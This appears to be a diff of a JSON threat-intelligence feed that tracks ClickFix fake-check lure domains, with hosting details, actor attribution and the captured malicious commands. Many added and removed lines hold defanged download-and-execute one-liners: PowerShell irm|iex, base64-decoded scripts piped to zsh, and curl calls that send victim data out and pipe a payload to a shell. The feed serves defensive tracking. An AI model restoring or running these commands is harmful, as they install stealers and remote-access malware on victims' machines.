@@ -5,7 +5,7 @@
   "short": "Fake checks that get victims to paste and run a command",
   "summary": "A fake CAPTCHA, browser update or error message, usually injected into a hacked legitimate website, copies a command to the clipboard and tells the victim to paste it into the Run dialog, a terminal or PowerShell. The command downloads and runs malware, typically an information stealer or a remote-access tool. Some campaigns fetch their next stage from a public blockchain so the hacked site never has to change."
  },
- "count": 5843,
+ "count": 5842,
  "indicators": [
   {
    "indicator": "06services.it",
@@ -31832,13 +31832,13 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "(irm 'hxxps[:]//holodeo[.]net/proliv_dante/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|&('i'+'e'+'x')",
     "(irm 'hxxps[:]//j7tracker[.]gb[.]net/prolivdante1/[id]')|iex",
+    "(irm 'hxxps[:]//holodeo[.]net/proliv_dante/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|&('i'+'e'+'x')",
     "(irm 'hxxps[:]//github[.]pw/danteproliv1/[id]')|iex"
    ],
    "connects_to": [
-    "holodeo.net",
     "j7tracker.gb.net",
+    "holodeo.net",
     "github.pw"
    ],
    "lure_from": [
@@ -32160,18 +32160,19 @@
    "actor": "dprk",
    "actor_link": "linked",
    "commands": [
-    "curl -sL -d \"id=70a95b84-60fd-4861-9f73-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Fatelierdejulie.com%2F&os=Mac%2015&lastVisitAt=2026-11-18T18%3A24%3A57.913Z&lastShellAt=2026-11-18T18%3A24%3A57.913Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\" && curl -s 'hxxps[:]//claude-flare-verification[.]vercel[.]app/mac' -L | sh",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=60dd8b8b-e0da-4b3c-acaf-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fatelierdejulie.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-18T18%3A15%3A39.398Z\"\" -d \"\"lastShellAt=2026-11-18T18%3A15%3A39.398Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//claude-flare-verification[.]vercel[.]app/win -L | cmd\"",
-    "curl -sL -d \"id=30e816e9-6b3f-4236-93e4-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Fatelierdejulie.com%2F&os=Mac%2015&lastVisitAt=2026-11-12T23%3A33%3A10.993Z&lastShellAt=2026-11-12T23%3A33%3A10.993Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\" && curl -s 'hxxps[:]//claude-flare-verification[.]vercel[.]app/mac' -L | sh"
+    "curl -sL -d \"id=b20b6f95-ec91-46a6-b1e8-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Fatelierdejulie.com%2F&os=Mac%2015&lastVisitAt=2026-11-25T18%3A58%3A27.259Z&lastShellAt=2026-11-25T18%3A58%3A27.259Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\" && curl -s 'hxxps[:]//claude-flare-verification[.]vercel[.]app/mac' -L | sh",
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=e9f31377-5618-4eac-a342-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fatelierdejulie.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-25T18%3A47%3A00.654Z\"\" -d \"\"lastShellAt=2026-11-25T18%3A47%3A00.654Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//claude-flare-verification[.]vercel[.]app/win -L | cmd\"",
+    "curl -sL -d \"id=70a95b84-60fd-4861-9f73-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Fatelierdejulie.com%2F&os=Mac%2015&lastVisitAt=2026-11-18T18%3A24%3A57.913Z&lastShellAt=2026-11-18T18%3A24%3A57.913Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\" && curl -s 'hxxps[:]//claude-flare-verification[.]vercel[.]app/mac' -L | sh"
    ],
    "connects_to": [],
    "lure_from": [
-    "jscdncloude.beer",
     "ncheck-brows.beer",
     "browse-cloud.codes",
+    "jscdncloude.beer",
     "codes.browse-cdn.beer",
     "id-verfied.boats",
-    "codes.caffe-img.com"
+    "codes.caffe-img.com",
+    "browse-login.info"
    ]
   },
   {
@@ -37351,14 +37352,15 @@
    "commands": [
     "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
     "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
-    "curl -sL -d \"id=190ec190-bffe-4e7c-acb2-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Fbancocedula-online.com%2F&os=Mac%2015&lastVisitAt=2026-11-18T19%3A28%3A31.273Z&lastShellAt=2026-11-18T19%3A28%3A31.273Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\" && curl -s 'hxxps[:]//claude-flare-verification[.]vercel[.]app/mac' -L | sh"
+    "curl -sL -d \"id=431a8aa0-a689-4e6c-b88e-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Fbancocedula-online.com%2F&os=Mac%2015&lastVisitAt=2026-11-25T19%3A51%3A51.573Z&lastShellAt=2026-11-25T19%3A51%3A51.573Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\" && curl -s 'hxxps[:]//claude-flare-verification[.]vercel[.]app/mac' -L | sh"
    ],
    "connects_to": [
     "fingerprint-veri.info",
     "hagosuro.lc"
    ],
    "lure_from": [
-    "browse-cloud.codes"
+    "browse-cloud.codes",
+    "browse-login.info"
    ]
   },
   {
@@ -50035,16 +50037,16 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
     "(irm 'hxxps[:]//j7tracker[.]gb[.]net/prolivdante1/[id]')|iex",
-    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/dan_proliv/[id]')|iex"
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
+    "echo '[encoded]' | base64 -d | zsh"
    ],
    "connects_to": [
     "j7tracker.gb.net",
     "xorados.com",
     "trek-72.com",
-    "github.pw",
-    "entitlementcheck.pro"
+    "entitlementcheck.pro",
+    "github.pw"
    ],
    "lure_from": [
     "interseq.at"
@@ -58692,12 +58694,13 @@
    "actor_link": null,
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
-    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/dan_proliv/[id]')|iex",
-    "(irm 'hxxps[:]//github[.]pw/dan_proliv/[id]')|iex"
+    "echo '[encoded]' | base64 -d | zsh",
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
     "xorados.com",
     "trek-72.com",
+    "entitlementcheck.pro",
     "j7tracker.gb.net",
     "github.pw"
    ],
@@ -63026,13 +63029,14 @@
    "actor_link": null,
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
-    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/dan_proliv/[id]')|iex",
-    "(irm 'hxxps[:]//github[.]pw/danteproliv1/[id]')|iex"
+    "echo '[encoded]' | base64 -d | zsh",
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
     "xorados.com",
     "trek-72.com",
     "github.pw",
+    "entitlementcheck.pro",
     "j7tracker.gb.net"
    ],
    "lure_from": [
@@ -69533,15 +69537,15 @@
    "actor_link": null,
    "commands": [
     "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
-    "(irm 'hxxps[:]//lepafonso[.]bz/dantestraff2929/[id]' -UserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36' -Headers @{'X-WUA'='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36'} -TimeoutSec 45)|iex"
+    "(irm 'hxxps[:]//lepafonso[.]bz/dantestraff2929/[id]' -UserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36' -Headers @{'X-WUA'='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36'} -TimeoutSec 45)|iex",
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null"
    ],
    "connects_to": [
     "hagosuro.lc",
+    "lepafonso.bz",
     "xorados.com",
     "trek-72.com",
     "github.pw",
-    "lepafonso.bz",
     "j7tracker.gb.net"
    ],
    "lure_from": [
@@ -70437,12 +70441,13 @@
    "actor_link": null,
    "commands": [
     "(irm 'hxxps[:]//lepafonso[.]bz/proliv_dante/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|&('i'+'e'+'x')",
-    "(irm 'hxxps[:]//holodeo[.]net/proliv_dante/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|&('i'+'e'+'x')",
-    "(irm 'hxxps[:]//github[.]pw/danteproliv1/[id]')|iex"
+    "(irm 'hxxps[:]//holodeo[.]net/saykatproliv1/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|&('i'+'e'+'x')",
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/prolivdante1/[id]')|iex"
    ],
    "connects_to": [
     "lepafonso.bz",
     "holodeo.net",
+    "j7tracker.gb.net",
     "github.pw"
    ],
    "lure_from": [
@@ -105810,13 +105815,13 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "echo '[encoded]' | base64 -d | zsh",
     "(irm 'hxxps[:]//j7tracker[.]gb[.]net/prolivdante1/[id]')|iex",
+    "echo '[encoded]' | base64 -d | zsh",
     "(irm 'hxxps[:]//github[.]pw/danteproliv1/[id]')|iex"
    ],
    "connects_to": [
-    "entitlementcheck.pro",
     "j7tracker.gb.net",
+    "entitlementcheck.pro",
     "github.pw"
    ],
    "lure_from": [
@@ -107926,8 +107931,8 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
     "(irm 'hxxps[:]//j7tracker[.]gb[.]net/prolivdante1/[id]')|iex",
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
     "(irm 'hxxps[:]//j7tracker[.]gb[.]net/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
@@ -109151,13 +109156,13 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "echo '[encoded]' | base64 -d | zsh",
     "(irm 'hxxps[:]//j7tracker[.]gb[.]net/prolivdante1/[id]')|iex",
+    "echo '[encoded]' | base64 -d | zsh",
     "(irm 'hxxps[:]//github[.]pw/danteproliv1/[id]')|iex"
    ],
    "connects_to": [
-    "entitlementcheck.pro",
     "j7tracker.gb.net",
+    "entitlementcheck.pro",
     "github.pw"
    ],
    "lure_from": [
@@ -171345,11 +171350,11 @@
     "hagosuro.lc",
     "groverudder12.com",
     "trek-72.com",
+    "lepafonso.bz",
     "jscdncloude.beer",
     "j7tracker.gb.net",
     "github.pw",
-    "t-trustresnew.com",
-    "lepafonso.bz"
+    "t-trustresnew.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -228788,8 +228793,8 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
     "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
     "(irm 'hxxps[:]//t-trustrest[.]com/dan_proliv/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex"
    ],
    "connects_to": [
@@ -228799,8 +228804,8 @@
     "trek-72.com",
     "groverudder12.com",
     "jscdncloude.beer",
+    "lepafonso.bz",
     "github.pw",
-    "cloud-browse.codes",
     "j7tracker.gb.net",
     "t-trustresnew.com"
    ],
@@ -282783,56 +282788,6 @@
    ],
    "connects_to": [],
    "lure_from": []
-  },
-  {
-   "indicator": "thehub-cic.co.uk",
-   "type": "domain",
-   "category": "clickfix",
-   "backend_for": null,
-   "campaign": null,
-   "role": "Redirector",
-   "status": "online",
-   "first_seen": "2026-11-12",
-   "last_seen": "2026-11-25",
-   "last_online": "2026-11-25",
-   "offline_since": null,
-   "url": "https://thehub-cic.co.uk/",
-   "brand": null,
-   "product": null,
-   "hosting": "KRYSTAL Krystal Hosting Ltd",
-   "dns": "GoDaddy",
-   "ip": "185.199.220.38",
-   "asn": "AS12488",
-   "org": "KRYSTAL Krystal Hosting Ltd, GB",
-   "country": "GB",
-   "ips": [
-    {
-     "ip": "185.199.220.38",
-     "asn": "AS12488",
-     "org": "KRYSTAL Krystal Hosting Ltd, GB",
-     "first_seen": "2026-11-12",
-     "last_seen": "2026-11-25"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "thehub-cic.co.uk",
-     "status": "online",
-     "first_seen": "2026-11-12",
-     "last_seen": "2026-11-25"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "(irm 'hxxps[:]//github[.]pw/danteproliv1/[id]')|iex"
-   ],
-   "connects_to": [
-    "github.pw"
-   ],
-   "lure_from": [
-    "interseq.at"
-   ]
   },
   {
    "indicator": "thejoints.shop",
